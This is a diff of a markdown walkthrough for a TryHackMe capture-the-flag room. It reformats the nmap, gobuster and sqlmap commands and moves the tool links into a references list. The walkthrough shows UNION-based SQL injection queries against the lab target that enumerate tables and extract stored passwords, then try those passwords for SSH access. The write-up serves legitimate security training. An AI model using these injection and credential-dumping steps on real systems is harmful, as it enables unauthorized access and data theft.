@@ -4,14 +4,15 @@ Our target is 10.10.105.134.
 
 This is a *very* simple site: An index page (`index.php`) that leads to a `shop.php` page, which in turn links to three calls of `item.php?id=X` (where `X` is a number).
 
-* Trying to include `/etc/os-release` via `item.php` causes the site to display a Dennis Nedry page that taunts you to use [SQLMap](sqlmap.md). Trying a hand-crafted test [SQL injection](sql-injection.md) also displays this page.
+* Trying to include `/etc/os-release` via `item.php` causes the site to display a Dennis Nedry page that taunts you to use SQLMap. Trying a hand-crafted test SQL injection also displays this page.
 * Trying different random indexes mostly doesn't work, though `item.php?id=100` displays a curiously broken page.
 * Trying `item.php?id=..` throws an SQL error revealing that the site is running on MySQL.
 
-Let's see if our usual [nmap](nmap.md) scan turns up anything interesting:
+Let's see if our usual nmap scan turns up anything interesting:
 
 ```bash
-sudo nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134
+sudo nmap -v -oA jurassic-park -Pn -A -T4 -sS \
+          -script vuln -p- 10.10.105.134
 ```
 
 This gives the following output:
@@ -326,10 +327,13 @@ OS and Service detection performed. Please report any incorrect results at https
 
 SSH and Apache on port 80. Pretty standard. There is an enumerated `/robots.txt` file, which turns out to be invalid -- it contains only the phrase "Wubbalubbadubdub".
 
-Let's also hit the target with [gobuster](gobuster.md):
+Let's also hit the target with gobuster:
 
 ```bash
-gobuster -t 50 dir -u http://10.10.105.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster \
+	-t 50 dir \
+	-u http://10.10.105.134 \
+	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 This reveals some interesting directories:
@@ -342,10 +346,11 @@ Out of curiosity, I tried loading `/item.php?id=robots.txt` to see if I could ge
 
 And indeed, trying `/item.php?id=0 or 1=1` brings up the same broken page as `/item.php?id=100`. So I think what's going on here is that `/item.php` is just doing some string filtering (it looks like it's probably also checking if you're trying to include a real file, as attempting to include non-existent files *doesn't* trigger it).
 
-What the hell, let's throw [SQLMap](sqlmap.md) at it anyway!
+What the hell, let's throw SQLMap at it anyway!
 
 ```bash
-sqlmap -u http://10.10.105.134/item.php?id=1 --dbms=mysql --dump-all --batch
+sqlmap -u http://10.10.105.134/item.php?id=1 \
+       --dbms=mysql --dump-all --batch
 ```
 
 Well, that didn't work.
@@ -369,31 +374,43 @@ select null, null, null, count(*), null from mysql.user
 We have four users. We can enumerate them by replacing `count(*)` with `User` and taking on a `limit` clause; this just reveals that the only users are `root` and three standard Debian system users that are used for upgrades and maintenance.
 
 ```sql
-select null, null, null, count(*), null from information_schema.tables
+select null, null, null, count(*), null
+from information_schema.tables
 ```
 
 This reveals that there are 282 tables managed by this MySQL instance (ouch!). But how many tables are in the `park` database (which is what's serving up this site)?
 
 ```sql
-select null, null, null, count(*), null from information_schema.tables where table_schema = "park"
+select null, null, null, count(*), null
+from information_schema.tables
+where table_schema = "park"
 ```
 
 Only two. That seems much better. I wonder what they are?
 
 ```sql
-select null, null, null, table_name, null from information_schema.tables where table_schema = "park" limit 0, 1
+select null, null, null, table_name, null
+from information_schema.tables
+where table_schema = "park"
+limit 0, 1
 ```
 
 So we have two tables, `items` and `users`. Let's see what the columns of the `users` table are.
 
 ```sql
-select null, null, null, column_name, null from information_schema.columns where table_schema = "park" and table_name = "users" limit 0, 1
+select null, null, null, column_name, null
+from information_schema.columns
+where table_schema = "park"
+	and table_name = "users"
+limit 0, 1
 ```
 
 So, the columns are `id`, `username`, and `password`. Nice. Let's dig into that table.
 
 ```sql
-select null, null, null, password, null from park.users limit 0, 1
+select null, null, null, password, null
+from park.users
+limit 0, 1
 ```
 
 Unfortunately, trying to include the `username` column triggers the annoying error, so all we can retrieve are two passwords, `D0nt3ATM3` and `ih8dinos`. Just for grins (and clued in by the structure of the flag questions), let's see if we can SSH into the box as either of these using the user `dennis`.
@@ -428,6 +445,10 @@ ELAPSED TIME: 2 h 53 min
 ## References
 
 * [TryHackMe: Jurassic Park](https://tryhackme.com/room/jurassicpark)
+* [Using “sqlmap”](sqlmap.md)
+* [SQL Injection](sql-injection.md)
+* [Using “nmap”](nmap.md)
+* [Using “gobuster”](gobuster.md)
 
 - - - -
 
